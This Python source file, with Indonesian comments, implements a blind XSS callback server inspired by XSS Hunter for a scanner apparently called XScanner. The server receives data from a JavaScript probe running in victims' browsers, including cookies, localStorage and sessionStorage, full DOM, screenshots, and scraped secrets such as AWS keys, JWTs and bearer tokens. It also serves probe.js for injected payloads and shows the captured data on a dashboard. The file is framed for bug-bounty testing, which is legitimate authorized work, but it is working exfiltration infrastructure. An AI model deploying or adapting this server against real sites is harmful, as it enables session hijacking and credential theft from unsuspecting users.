"""
scanner/rich_blind_server.py

Rich Blind XSS Server — terinspirasi XSS Hunter express.
Menerima callback dari probe JavaScript di browser korban,
menyimpan:
  - Screenshot halaman (base64 JPEG via html2canvas)
  - Cookies, localStorage, sessionStorage
  - Full DOM HTML
  - Secrets yang ditemukan (AWS key, JWT, Bearer, dll)
  - URL, referer, user-agent, IP
  - Form fields yang ada di halaman
  - Links dan script sources
  - Correlated injection ID (tahu payload mana yang fire)

Juga serve probe.js untuk src-load payloads.
"""

import asyncio
import json
import os
import time
import base64
from pathlib import Path
from typing import Optional

from aiohttp import web
from utils.logger import finding, info, warn, success
from utils.config import Context
from payloads.blind_probe import BlindProbeGenerator


class RichBlindServer:
    """
    Blind XSS server dengan kemampuan data collection lengkap.
    Jalankan dengan --start-rich-blind-server atau --blind-callback.
    """

    def __init__(
        self,
        host:       str  = "0.0.0.0",
        port:       int  = 8765,
        output_dir: str  = "./blind_xss_hits",
        probe_gen:  Optional[BlindProbeGenerator] = None,
    ):
        self.host       = host
        self.port       = port
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.probe_gen  = probe_gen
        self._runner    = None
        self.hits: list = []
        self._hit_count = 0

    def get_callback_url(self, public_host: str = None) -> str:
        """Return callback URL untuk dimasukkan ke probe."""
        host = public_host or self.host
        if host == "0.0.0.0":
            import socket
            try:
                host = socket.gethostbyname(socket.gethostname())
            except Exception:
                host = "127.0.0.1"
        return f"http://{host}:{self.port}"

    async def start(self):
        app = web.Application()
        # Route utama untuk menerima fire dari probe
        app.router.add_post("/fire",          self._handle_fire)
        app.router.add_get("/fire",           self._handle_fire_get)  # beacon fallback
        app.router.add_options("/fire",       self._handle_preflight)
        # Serve probe.js untuk src-load payloads
        app.router.add_get("/probe.js",       self._serve_probe_js)
        # Dashboard sederhana untuk lihat hits
        app.router.add_get("/",               self._dashboard)
        app.router.add_get("/hits",           self._api_hits)
        app.router.add_get("/hits/{hit_id}",  self._api_hit_detail)
        # Wildcard
        app.router.add_route("*", "/{path_info:.*}", self._handle_legacy)

        self._runner = web.AppRunner(app)
        await self._runner.setup()
        await web.TCPSite(self._runner, self.host, self.port).start()
        cb_url = self.get_callback_url()
        info(f"Rich Blind XSS server: {cb_url}")
        info(f"  Dashboard: {cb_url}/")
        info(f"  Probe JS:  {cb_url}/probe.js")
        info(f"  Hits API:  {cb_url}/hits")
        info(f"  Output:    {self.output_dir}/")

    # ─── CORS headers ─────────────────────────────────────────────────────────
    @staticmethod
    def _cors(extra: dict = None) -> dict:
        headers = {
            "Access-Control-Allow-Origin":  "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Max-Age":       "86400",
        }
        if extra:
            headers.update(extra)
        return headers

    async def _handle_preflight(self, request: web.Request) -> web.Response:
        return web.Response(status=204, headers=self._cors())

    # ─── Fire handler ─────────────────────────────────────────────────────────
    async def _handle_fire(self, request: web.Request) -> web.Response:
        """Terima callback dari probe JavaScript."""
        try:
            body = await request.text()
            data = json.loads(body) if body.strip() else {}
        except Exception:
            data = {}

        data["server_ip"]  = request.remote
        data["server_time"]= time.time()

        await self._process_hit(data)
        return web.Response(text="OK", status=200, headers=self._cors())

    async def _handle_fire_get(self, request: web.Request) -> web.Response:
        """GET fallback untuk simple callback."""
        data = dict(request.rel_url.query)
        data["server_ip"]  = request.remote
        data["server_time"]= time.time()
        await self._process_hit(data)
        return web.Response(
            text="OK", status=200,
            headers=self._cors({"Content-Type": "text/plain"})
        )

    async def _process_hit(self, data: dict):
        """Proses dan simpan satu hit."""
        self._hit_count += 1
        hit_id = f"hit_{self._hit_count:04d}_{int(time.time())}"

        hit = {
            "id":       hit_id,
            "time":     time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            "url":      data.get("url", ""),
            "referer":  data.get("ref",  ""),
            "ua":       data.get("ua",   ""),
            "title":    data.get("title",""),
            "ip":       data.get("server_ip", ""),
            "cookies":  data.get("cookies", ""),
            "local_storage":   data.get("localStorage",   {}),
            "session_storage": data.get("sessionStorage", {}),
            "secrets":  data.get("secrets",  []),
            "forms":    data.get("forms",    []),
            "links":    data.get("links",    []),
            "scripts":  data.get("scripts",  []),
            "injection_id": data.get("id", ""),
        }

        # Screenshot — simpan ke file
        screenshot = data.get("screenshot", "")
        if screenshot and screenshot.startswith("data:image"):
            try:
                img_data = base64.b64decode(screenshot.split(",", 1)[1])
                img_path = self.output_dir / f"{hit_id}_screenshot.jpg"
                img_path.write_bytes(img_data)
                hit["screenshot_path"] = str(img_path)
                hit["has_screenshot"]  = True
            except Exception:
                hit["has_screenshot"] = False
        else:
            hit["has_screenshot"] = False

        # DOM HTML — simpan ke file
        dom_html = data.get("dom", "")
        if dom_html:
            dom_path = self.output_dir / f"{hit_id}_dom.html"
            dom_path.write_text(dom_html, encoding="utf-8", errors="replace")
            hit["dom_path"] = str(dom_path)
            hit["dom_size"] = len(dom_html)

        # Simpan JSON lengkap
        json_path = self.output_dir / f"{hit_id}.json"
        json_path.write_text(json.dumps(hit, indent=2, ensure_ascii=False))

        self.hits.append(hit)

        # Update probe_gen jika ada
        if self.probe_gen and hit["injection_id"]:
            self.probe_gen.mark_fired(hit["injection_id"], hit)

        # Log ke terminal
        secrets_summary = ""
        if hit["secrets"]:
            types = [s.get("type","?") for s in hit["secrets"]]
            secrets_summary = f" | SECRETS: {', '.join(types)}"

        success(f"BLIND XSS FIRED! [{hit_id}]")
        info(f"  URL:      {hit['url'][:80]}")
        info(f"  Title:    {hit['title'][:60]}")
        info(f"  IP:       {hit['ip']}")
        info(f"  UA:       {hit['ua'][:60]}")
        if hit["cookies"]:
            info(f"  Cookies:  {hit['cookies'][:100]}")
        if hit["local_storage"]:
            keys = list(hit["local_storage"].keys())[:5]
            info(f"  LocalStorage keys: {keys}")
        if hit["has_screenshot"]:
            info(f"  Screenshot: {hit['screenshot_path']}")
        if hit.get("dom_path"):
            info(f"  DOM saved: {hit['dom_path']} ({hit['dom_size']} chars)")
        if hit["secrets"]:
            warn(f"  SECRETS FOUND:{secrets_summary}")
            for s in hit["secrets"]:
                warn(f"    {s.get('type')}: {s.get('matches',[])[0][:50] if s.get('matches') else '?'}")

        # Log sebagai finding
        finding(
            url      = hit["url"] or f"http://{self.host}:{self.port}",
            param    = "blind_xss",
            payload  = f"[Blind XSS Fire] {hit_id} from {hit['ip']}",
            xss_type = "blind_xss",
            context  = Context.UNKNOWN,
        )

    # ─── Probe JS server ──────────────────────────────────────────────────────
    async def _serve_probe_js(self, request: web.Request) -> web.Response:
        """Serve probe.js untuk src-load payloads."""
        injection_id = request.rel_url.query.get("id", "unknown")
        cb_url = self.get_callback_url()

        if self.probe_gen:
            probe_js, _ = self.probe_gen.generate_probe(
                url=request.headers.get("Referer", ""),
                param="src_load",
            )
        else:
            gen = BlindProbeGenerator(cb_url, include_screenshot=True)
            probe_js, _ = gen.generate_probe(param="src_load")

        return web.Response(
            text=probe_js,
            content_type="application/javascript",
            headers=self._cors(),
        )

    # ─── Dashboard ────────────────────────────────────────────────────────────
    async def _dashboard(self, request: web.Request) -> web.Response:
        """HTML dashboard sederhana."""
        rows = ""
        for h in reversed(self.hits[-50:]):
            secret_badge = (
                f'<span style="color:red;font-weight:bold">⚠ SECRETS</span>'
                if h.get("secrets") else ""
            )
            screenshot_badge = "📷" if h.get("has_screenshot") else ""
            rows += f"""
            <tr>
              <td>{h['time']}</td>
              <td>{h['ip']}</td>
              <td title="{h['url']}">{h['url'][:60]}...</td>
              <td>{h['title'][:40]}</td>
              <td>{'✓' if h['cookies'] else ''}</td>
              <td>{'✓' if h['local_storage'] else ''}</td>
              <td>{screenshot_badge} {secret_badge}</td>
              <td><a href="/hits/{h['id']}" style="color:#4af">detail</a></td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html><head><title>XScanner Blind XSS — {len(self.hits)} Hits</title>
<meta charset="utf-8">
<style>
  body{{background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px}}
  h1{{color:#4ade80}} table{{width:100%;border-collapse:collapse;margin-top:20px}}
  th{{background:#21262d;padding:8px;text-align:left;color:#4ade80}}
  td{{padding:6px 8px;border-bottom:1px solid #30363d;font-size:0.85em}}
  tr:hover td{{background:#161b22}}
  .badge{{background:#ef4444;color:white;padding:2px 6px;border-radius:4px;font-size:0.75em}}
</style></head>
<body>
<h1>🎯 XScanner Rich Blind XSS Server</h1>
<p>Hits: <strong>{len(self.hits)}</strong> | 
   Output: <code>{self.output_dir}</code> |
   Probe JS: <a href="/probe.js" style="color:#4af">/probe.js</a></p>
<table>
  <tr>
    <th>Time</th><th>IP</th><th>URL</th><th>Title</th>
    <th>Cookies</th><th>Storage</th><th>Extras</th><th>Detail</th>
  </tr>
  {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666">No hits yet — inject payloads and wait...</td></tr>'}
</table>
</body></html>"""
        return web.Response(text=html, content_type="text/html", headers=self._cors())

    async def _api_hits(self, request: web.Request) -> web.Response:
        """JSON API untuk list hits."""
        summary = [
            {k: v for k, v in h.items()
             if k not in ("dom_path", "screenshot_path")}
            for h in self.hits
        ]
        return web.Response(
            text=json.dumps(summary, indent=2),
            content_type="application/json",
            headers=self._cors(),
        )

    async def _api_hit_detail(self, request: web.Request) -> web.Response:
        """Detail satu hit."""
        hit_id = request.match_info["hit_id"]
        hit    = next((h for h in self.hits if h["id"] == hit_id), None)
        if not hit:
            return web.Response(text="Not found", status=404, headers=self._cors())
        # Load DOM if saved
        detail = dict(hit)
        dom_path = hit.get("dom_path")
        if dom_path and os.path.exists(dom_path):
            detail["dom_preview"] = open(dom_path).read(5000)
        return web.Response(
            text=json.dumps(detail, indent=2),
            content_type="application/json",
            headers=self._cors(),
        )

    async def _handle_legacy(self, request: web.Request) -> web.Response:
        """Handle legacy XSS Hunter-style callbacks."""
        data = {
            "url":         request.headers.get("Referer", ""),
            "ua":          request.headers.get("User-Agent", ""),
            "server_ip":   request.remote,
            "server_time": time.time(),
            **dict(request.rel_url.query),
        }
        try:
            body = await request.text()
            if body:
                data.update(json.loads(body))
        except Exception:
            pass
        await self._process_hit(data)
        return web.Response(text="OK", status=200, headers=self._cors())

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()
        info(f"Rich Blind XSS server stopped. Total hits: {len(self.hits)}")

    def get_hits(self) -> list:
        return list(self.hits)

    def generate_report_md(self) -> str:
        """Generate Markdown report dari semua hits — siap bug bounty."""
        if not self.hits:
            return "# Blind XSS Report\n\nNo hits recorded.\n"

        lines = [
            "# Blind XSS Report — XScanner",
            f"Generated: {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}",
            f"Total hits: {len(self.hits)}",
            "",
        ]
        for i, h in enumerate(self.hits, 1):
            lines += [
                f"## Hit #{i} — {h['id']}",
                f"- **Time:** {h['time']}",
                f"- **URL:** `{h['url']}`",
                f"- **IP:** {h['ip']}",
                f"- **User-Agent:** {h['ua']}",
                f"- **Referer:** {h.get('referer','')}",
                f"- **Title:** {h['title']}",
            ]
            if h.get("cookies"):
                lines.append(f"- **Cookies:** `{h['cookies'][:200]}`")
            if h.get("local_storage"):
                keys = list(h["local_storage"].keys())[:10]
                lines.append(f"- **localStorage keys:** {keys}")
            if h.get("secrets"):
                lines.append("- **⚠ SECRETS FOUND:**")
                for s in h["secrets"]:
                    m = s.get("matches", ["?"])[0]
                    lines.append(f"  - `{s.get('type')}`: `{str(m)[:60]}`")
            if h.get("has_screenshot"):
                lines.append(f"- **Screenshot:** {h.get('screenshot_path','')}")
            lines.append("")
        return "\n".join(lines)
